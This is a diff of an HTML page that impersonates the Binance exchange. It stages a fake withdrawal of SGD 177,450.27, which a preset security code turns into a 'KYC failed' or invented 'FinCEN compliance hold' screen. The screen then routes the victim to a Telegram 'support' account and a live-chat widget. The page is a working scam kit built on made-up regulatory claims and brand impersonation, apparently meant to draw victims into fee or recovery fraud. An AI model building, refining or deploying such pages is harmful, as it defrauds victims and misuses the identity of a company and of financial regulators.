@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto</title>
+    <title>Binance Protocol Index</title>
     <!-- Core Bootstrap 5 CDN Link -->
-    <link href="https://jsdelivr.net" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         :root {
             --term-dark-bg: #0b0e11;
@@ -68,7 +68,6 @@
             transition: all 0.2s ease;
             text-decoration: none;
             display: inline-block;
-            cursor: pointer;
         }
         .btn-term-gold:hover {
             background-color: var(--term-gold-hover) !important;
@@ -160,6 +159,7 @@
             50% { opacity: 0.6; }
         }
 
+        /* Live Agent Widget Styling */
         .live-agent-widget {
             position: fixed;
             bottom: 30px;
@@ -184,6 +184,10 @@
         .agent-bubble:hover {
             transform: scale(1.1);
             box-shadow: 0 6px 16px rgba(240, 185, 11, 0.5);
+        }
+
+        .agent-logo {
+            font-size: 2.5rem;
         }
 
         .agent-status {
@@ -233,19 +237,20 @@
 </head>
 <body class="terminal-layout">
 
+    <!-- APPLICATION HEADER -->
     <header class="terminal-top-bar">
         <div class="container d-flex justify-content-between align-items-center">
             <div class="fw-bold text-white fs-5" style="letter-spacing: 0.5px;">
                 <span style="color: var(--term-accent-gold);">SOVEREIGN</span> BINANCE PROTOCOL
             </div>
-            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">BINANCE COMPLIANCE SECURITY</span>
+            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">BINANCE  COMPLIANCE SECURITY</span>
         </div>
     </header>
 
     <div class="container pb-5">
         <div class="row justify-content-center">
             <div class="col-md-8 col-lg-6">
-                
+
                 <!-- STEP 1: WALLET HOME -->
                 <div id="layerWallet" class="app-flow-card text-center">
                     <h3 class="fw-bold mb-2 text-white">Digital Asset Wallet</h3>
@@ -275,9 +280,7 @@
                     <button class="btn-message" onclick="switchToWallet()" style="background-color: var(--term-border); margin-top: 10px;">Cancel</button>
                 </div>
 
-
-
-<!-- STEP 3: SECURITY AUTHENTICATION INPUT -->
+                <!-- STEP 3: SECURITY AUTHENTICATION INPUT -->
                 <div id="layerPINVerification" class="app-flow-card d-none text-center">
                     <h3 class="fw-bold mb-2 text-white">Security Sign-Off Required</h3>
                     <p style="color: var(--term-text-muted);" class="small mb-4">Input the 6-digit security code to authorize the withdrawal of SGD 177,450.27.</p>
@@ -295,35 +298,36 @@
                     <p class="text-muted small mb-0">Validating security parameters and preparing asset transfer.</p>
                 </div>
 
-                <!-- STEP 5: KYC FAILED - FINCEN COMPLIANCE HOLD (BAGONG DESIGN) -->
-                <div id="layerKYCFailed" class="app-flow-card d-none text-start">
-                    <div class="text-center mb-3">
-                        <h3 class="m-0" style="color: var(--error-red); font-size: 3.5rem;">⚠️</h3>
-                        <h4 class="fw-bold text-white mt-2">Withdrawal Blocked: FinCEN Compliance Hold Active</h4>
+                <!-- STEP 5: KYC FAILED - INSUFFICIENT DOCUMENTS -->
+                <div id="layerKYCFailed" class="app-flow-card d-none text-center">
+                    <div class="d-flex align-items-center gap-3 mb-3 justify-content-center">
+                        <h3 class="m-0" style="color: var(--error-red); font-size: 3rem;">✕</h3>
                     </div>
+                    <h4 class="fw-bold m-0 text-white mb-3">KYC Verification Failed</h4>
                     <hr class="border-secondary">
                     
-                    <div class="security-notice-text small text-white-50 mb-4" style="line-height: 1.6; text-align: justify;">
-                        <p class="mb-3 text-white">Your withdrawal request of <strong>177,450.27 SGD</strong> has been intercepted and placed on a federal regulatory hold under United States financial frameworks.</p>
-                        <p class="mb-3">As a global digital asset platform, Binance strictly operates in full compliance with international financial authorities. During our automated international compliance sweep, your wallet network activity triggered a Tier-2 risk flag. In strict accordance with Binance's regulatory obligations under the US Department of the Treasury’s FinCEN (Financial Crimes Enforcement Network) mandates, the Bank Secrecy Act (BSA), and the SEC (Securities and Exchange Commission) cross-border digital asset guidelines, withdrawal access is restricted until identity verification is fully remediated.</p>
+                    <div class="security-notice-text small text-white-50 mb-4">
+                        <p class="mb-3"><strong>Status:</strong> WITHDRAWAL BLOCKED - INSUFFICIENT DOCUMENTS</p>
+                        <p class="mb-3">Your account has failed KYC (Know Your Customer) verification due to incomplete or insufficient documentation.</p>
+                        <p class="mb-3">Your funds remain in your account but are currently on hold pending document resubmission and re-verification.</p>
                         
-                        <div class="code-details-block" style="background-color: rgba(20, 25, 30, 0.9); font-family: monospace; border-left: 4px solid var(--term-accent-gold);">
-                            <p class="m-0 text-warning fw-bold mb-2">Compliance & Transaction Audit:</p>
-                            <p class="m-0">Platform Status: Binance Regulatory Compliance Protocol Active</p>
-                            <p class="m-0">Requested Amount: 177,450.27 SGD</p>
-                            <p class="m-0">Asset Origin: United States Liquidity Pool (US-East Clear)</p>
-                            <p class="m-0">Current Status: US Federal Regulatory Escrow / Restricted Liquidity</p>
-                            <p class="m-0">Audit Reference: TXN-US-SGD-99410A7X</p>
-                            <p class="m-0 text-danger">System Flag: Code 403-FinCEN / Cross-Border Threshold Exceeded</p>
+                        <div class="error-highlight-box text-white">
+                            <p class="mb-2"><strong>⚠️ Account Status:</strong></p>
+                            <p class="m-0">FUNDS ON HOLD - KYC VERIFICATION FAILED</p>
                         </div>
 
-                        <p class="mb-0 mt-3 text-white fw-bold">Mandatory Action Required:</p>
-                        <p class="mt-1">The total amount of 177,450.27 SGD is secured in a US-regulated federal custodian vault. Binance is legally required to uphold these verification frameworks. To trigger an automated release and route the funds back to your destination account, you must instantly complete the advanced biometric verification.</p>
+                        <div class="code-details-block">
+                            <p class="m-0 text-danger fw-bold">ACCOUNT REFERENCE:</p>
+                            <p class="m-0" id="failedRef">***-****-258349</p>
+                            <p class="m-0">Amount: SGD 177,450.27</p>
+                            <p class="m-0">Status: ✕ BLOCKED - INSUFFICIENT DOCUMENTS</p>
+                            <p class="m-0 mt-2">Reason: KYC verification documents incomplete</p>
+                        </div>
                     </div>
 
-                    <!-- SUBMIT DISPUTE AT CANCEL TRIGGER -->
-                    <button class="btn-message w-100 text-uppercase" onclick="openLiveChat()" style="background-color: var(--error-red) !important; color: white !important;">SUBMIT DISPUTE</button>
-                    <button class="btn-message" onclick="switchToWallet()" style="background-color: var(--term-border); margin-top: 10px; color: #848e9c !important;">Cancel</button>
+                    <p class="text-muted small mb-3">Need to dispute this decision or resubmit documents?</p>
+                    <a href="https://t.me/BINANCESUPPORT014" target="_blank" class="btn-dispute">🔴 Open Dispute & Chat with Support</a>
+                    <a href="https://t.me/BINANCESUPPORT014" target="_blank" class="btn-message">📨 Resubmit Documents</a>
                 </div>
 
                 <!-- STEP 6: SUCCESS COMPLETION -->
@@ -361,76 +365,79 @@
 
     <!-- LIVE AGENT WIDGET -->
     <div class="live-agent-widget">
-        <div class="agent-bubble" onclick="openLiveChat()">
+        <div class="agent-bubble">
             <div class="agent-profile-avatar">B</div>
             <div class="agent-status"></div>
             <div class="agent-tooltip">Live Agent Support</div>
         </div>
     </div>
 
-    <!-- TAWK.TO SCRIPT ENGINE -->
-    <!--Start of Tawk.to Script-->
-    <script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-    s1.async=true;
-    s1.src='https://embed.tawk.to/6a1cd8c4e717081c2b47ed79/default';
-    s1.charset='UTF-8';
-    s1.setAttribute('crossorigin','*');
-    s0.parentNode.insertBefore(s1,s0);
-    })();
-    </script>
-    <!--End of Tawk.to Script-->
-
     <!-- JAVASCRIPT STATE CONTROLLER MATRIX -->
     <script>
-        // Lilitaw agad ang biometric page pagka-load ng window
-        window.addEventListener('DOMContentLoaded', () => {
-            switchLayer('layerBiometricVerification');
-        });
-
-        function switchLayer(targetLayerId) {
-            const layers = ['layerWallet', 'layerBiometricVerification', 'layerPINVerification', 'layerLoadingWheel', 'layerKYCFailed', 'layerSuccess'];
-            layers.forEach(id => {
-                const element = document.getElementById(id);
-                if (element) {
-                    if (id === targetLayerId) element.classList.remove('d-none');
-                    else element.classList.add('d-none');
-                }
-            });
-        }
-
-        function showBiometricVerification() { switchLayer('layerBiometricVerification'); }
-        function executeBiometricVerification() { switchLayer('layerPINVerification'); }
-        function switchToWallet() { switchLayer('layerWallet'); }
-
-        // Code verification rule logic (Trigger 120352)
-        function executeTokenValidation() {
-            const userInput = document.getElementById('pinVerificationInput').value;
-            switchLayer('layerLoadingWheel');
+        // State machine visibility toggle utility
+        function switchState(hideElementId, showElementId) {
+            const hideTarget = document.getElementById(hideElementId);
+            const showTarget = document.getElementById(showElementId);
             
-            setTimeout(() => {
-                if (userInput === "120352") {
-                    switchLayer('layerKYCFailed'); // Ipakita ang FinCEN block page
-                } else {
-                    switchLayer('layerSuccess'); // Tagumpay kapag iba ang code
-                }
-            }, 2500);
-        }
-
-        // Tawk.to trigger function para sa Submit Dispute button
-        function openLiveChat() {
-            if (typeof Tawk_API !== 'undefined' && typeof Tawk_API.maximize === 'function') {
-                Tawk_API.maximize();
-            } else {
-                alert('Connecting to live compliance engine...');
+            if (hideTarget && showTarget) {
+                hideTarget.classList.add('d-none');
+                showTarget.classList.remove('d-none');
             }
         }
 
+        // Show biometric verification layer
+        function showBiometricVerification() {
+            switchState('layerWallet', 'layerBiometricVerification');
+        }
+
+        // Switch back to wallet
+        function switchToWallet() {
+            switchState('layerBiometricVerification', 'layerWallet');
+        }
+
+        // Execute biometric verification
+        function executeBiometricVerification() {
+            // Simulate biometric processing delay
+            const biometricIcon = document.querySelector('.biometric-icon');
+            if (biometricIcon) {
+                biometricIcon.textContent = '✓';
+                biometricIcon.style.color = 'var(--success-green)';
+            }
+            
+            setTimeout(function() {
+                switchState('layerBiometricVerification', 'layerPINVerification');
+                // Reset biometric icon for next cycle
+                if (biometricIcon) {
+                    biometricIcon.textContent = '🔐';
+                    biometricIcon.style.color = 'inherit';
+                }
+            }, 2000);
+        }
+
+        // Process secure code input logic checks
+        function executeTokenValidation() {
+            const secretCodeField = document.getElementById('pinVerificationInput');
+            
+            // Dynamic input validation evaluation matching lab parameters
+            if (secretCodeField && secretCodeField.value.trim() === "120352") {
+                switchState('layerPINVerification', 'layerLoadingWheel');
+                
+                // Emulates an algorithmic execution processing delay before KYC failed state
+                setTimeout(function() {
+                    switchState('layerLoadingWheel', 'layerKYCFailed');
+                }, 3000);
+            } else {
+                alert("Security matrix mismatch: Input parameters incorrect.");
+            }
+        }
+
+        // Clean structural variables state baseline back to origin
         function resetWorkflowIndex() {
-            document.getElementById('pinVerificationInput').value = '';
-            switchLayer('layerBiometricVerification');
+            const targetPin = document.getElementById('pinVerificationInput');
+            
+            if (targetPin) targetPin.value = '';
+            
+            switchState('layerSuccess', 'layerWallet');
         }
     </script>
 
